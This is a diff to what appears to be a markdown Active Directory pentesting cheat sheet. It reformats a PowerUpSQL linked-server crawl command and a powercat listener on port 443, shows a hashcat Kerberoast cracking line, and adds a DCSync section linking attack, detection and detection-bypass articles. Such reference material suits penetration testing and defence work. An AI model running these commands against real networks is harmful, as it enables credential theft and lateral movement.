@@ -556,7 +556,9 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 . ./PowerUPSQL.ps1
 Get-SQLInstanceLocal -Verbose
-(Get-SQLServerLinkCrawl -Verbose -Instance "10.10.10.20" -Query 'select * from master..sysservers').customquery Import-Module .\powercat.ps1 powercat -l -v -p 443 -t 10000
+(Get-SQLServerLinkCrawl -Verbose -Instance "10.10.10.20" -Query 'select * from master..sysservers').customquery 
+
+Import-Module .\powercat.ps1 powercat -l -v -p 443 -t 10000
 ```
 
 ### Relay attacks
@@ -1118,6 +1120,14 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 - https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol
 - http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm
 
+### DCSYNC
+
+
+
+- [Primer on DCSync attack](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)
+- [ADSecurity - Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729)
+- [Ired Team - Dump Password From DC with DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
+- [Synacktiv - Dive Into MDI - DCsync detection bypass](https://www.synacktiv.com/publications/a-dive-into-microsoft-defender-for-identity.html)
 
 ### Accessing LSASS secrets
 
